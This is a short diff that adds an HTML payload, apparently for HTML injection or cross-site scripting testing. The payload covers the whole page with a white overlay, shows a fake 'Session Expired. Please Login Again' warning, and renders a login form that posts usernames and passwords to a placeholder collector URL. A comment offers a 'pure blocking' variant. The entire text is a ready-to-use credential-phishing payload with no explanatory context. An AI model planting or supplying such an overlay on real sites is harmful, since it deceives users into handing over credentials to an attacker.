@@ -1,0 +1,19 @@
+<div style="position:fixed;top:0;left:0;width:100%;height:100%;
+
+background:white;z-index:999999">
+
+<!-- optional fake form shown here for clarity; remove for pure blocking -->
+
+<h2 style="color:red">⚠️ Session Expired. Please Login Again</h2>
+
+<form action="https://example[.]com/collector" method="post">
+
+<input type="text" name="user" placeholder="Username">
+
+<input type="password" name="pass" placeholder="Password">
+
+<input type="submit" value="Login">
+
+</form>
+
+</div>
